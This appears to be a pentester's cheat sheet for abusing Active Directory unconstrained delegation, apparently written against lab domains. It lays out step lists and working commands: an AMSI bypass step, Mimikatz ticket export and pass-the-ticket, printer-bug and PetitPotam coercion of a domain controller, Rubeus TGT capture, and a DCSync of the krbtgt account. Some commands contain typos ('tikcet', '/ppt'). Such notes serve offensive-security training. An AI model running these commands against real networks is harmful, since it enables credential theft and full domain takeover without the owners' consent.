# Using PowerShell
## Methodology/Steps
> 1. For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack
> 2. Get a Powershell session as a different user using **"Over pass the hash"** attack if required(in this case its **pwn2/appadmin**)
> 3. We can try searching for local admins it has access to using **Find-LocalAdminAccess -Verbose**
> 4. Create a **New-PSSession** attaching to the **"Unconstrained user"**
> 5. Enter the new session using **Enter-PSSession**
> 6. Bypass the *AMSI*
> 7. EXIT
> 8. Load **Mimikatz.ps1** on the new session using **Invoke-command**
> 9. Enter the new session using **Enter-PSSession** *again*
> 10. Now we can get the admin token and save it to the disk
> 11. Try and check if you have any file from a DA
> 12. If not we can try to pull if there is any sessions logged on as *Administrator* as pwn0 using **Invoke-Hunter** then run the attack again
> 13. Once we get an DA token we can Reuse the token using **Invoke-Mimikatz**
> 14. Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or use **WMI-Commands** / **ScriptBlock:Not sure**

---

## PowerView
### Enumerate computers with Unconstrained Delegation
```powershell
Get-NetComputer -UnConstrained
```
```ad-note
Ignore the domain controllers if they apeare in the list as they have Unconstrained Delegation enabled
```

### Check if a token is available and save to disk
> **Get admin token**
> After compromising the computer with UD enabled, we can trick or wait for an admin connection
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

### Reuse of the DA token
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi"'
```

---

## Invoke-Hunter
### Pull any sessions if logged on with administrator/ Printer Bug
```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

---
# Using Binaries
## Methodology/Steps
> 1. Set Rubeus on monitor mode
> 2. Run Print Bug using MS-RPRN or PetitPotman
> 3. You will get the TGT on rubues
> 4. Copy and inject that into memory using */ppt* or do it manually
> 5. Now you can access the shares or do a DCSync Attack

---

## Print Bug 
### 1. MS-RPRN
> https://github.com/leechristensen/SpoolSample
```powershell
MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```
$$ OR $$
### 1. PetitPotam
> https://github.com/topotam/PetitPotam
```powershell
PetitPotam.exe us-web us-dc
```
```ad-note
PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC
```

---

## Rubeus
### 2. Capture the TGT and Jump or Run DCsync
```powershell
# Captute the TGT
Rubeus.exe monitor /interval:5

# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine
Rubeus.exe ptt /tikcet:

# OR use Invoke-Mimikatz
[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'

# Run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```
